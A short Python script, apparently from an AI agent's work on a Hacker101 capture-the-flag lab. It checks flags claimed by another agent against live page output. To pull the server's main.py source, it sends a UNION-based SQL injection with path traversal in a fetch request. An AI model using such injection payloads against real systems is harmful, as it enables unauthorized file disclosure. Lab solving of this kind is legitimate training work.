#!/usr/bin/env python3
"""Exact comparison: live flag values vs the other agent's claimed flags."""
import re
import sys
import urllib.request

BASE = "https://f69716e4ca42fa5db261fc835d4fddee.ctf.hacker101.com"

# Claimed values transcribed from the other agent's pasted report
CLAIMED_ENV = [
    "0f86f36828806eddc899aa73f76ed0c582b0ce6419a3d936c8de660caef24637b",  # flag0 placeholder
]
# We'll read the claimed values from a file to avoid transcription drift
CLAIM_FILE = sys.argv[1] if len(sys.argv) > 1 else "scripts/claimed_flags.txt"


def get(p):
    with urllib.request.urlopen(BASE + p, timeout=15) as r:
        return r.read().decode("utf-8", "replace")


def main():
    home = get("/")
    src = get("/fetch?id=-1+UNION+SELECT+%27../main.py%27--%20")

    live_env = re.findall(r"\^FLAG\^([0-9a-f]{64})\$FLAG\$", home)
    live_src = re.findall(r"\^FLAG\^([0-9a-f]{64})\$FLAG\$", src)

    print("LIVE env-footer flags:")
    for f in live_env:
        print("  ", f)
    print("LIVE main.py comment flags:")
    for f in live_src:
        print("  ", f)

    try:
        with open(CLAIM_FILE) as fh:
            lines = [l.strip() for l in fh if l.strip()]
            claimed = [l.split()[0] for l in lines]
    except FileNotFoundError:
        print(f"\n[!] no claim file at {CLAIM_FILE} — write claimed flags there")
        return

    print("\n=== COMPARISON ===")
    if claimed:
        for i, a in enumerate(claimed):
            srcd = f"(claimed[{i}])"
            if a in live_env or a in live_src:
                print(f"  {srcd} {a[:20]}...  ->  FOUND LIVE  MATCH")
            else:
                print(f"  {srcd} {a[:20]}...  ->  NOT FOUND in live output")
    else:
        print("  (no claimed flags loaded)")


if __name__ == "__main__":
    main()